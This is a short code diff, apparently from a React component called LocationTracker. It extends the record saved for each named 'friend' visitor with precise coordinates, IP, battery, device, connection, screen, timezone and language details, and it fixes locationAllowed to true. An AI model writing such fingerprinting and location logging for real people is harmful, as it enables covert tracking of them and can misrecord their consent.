@@ -98,14 +98,23 @@ const LocationTracker = ({ onLocationDetected }) => {
           console.log('Error getting IP');
         }
 
+        // Salvează datele cu toate noile informații
         const visitorData = {
           friend: friendName,
           friendCode: friendCode,
           timestamp: new Date().toLocaleString('ro-RO'),
-          locationAllowed: false,
-          coordinates: null,
+          unixTimestamp: Date.now(),
+          locationAllowed: true,
+          coordinates: coords,
           userAgent: navigator.userAgent,
           ip: ip,
+          battery: await getBatteryInfo(),
+          device: getDeviceInfo(),
+          connection: getConnectionInfo(),
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          language: navigator.language,
+          platform: navigator.platform,
           page: window.location.href
         };
 
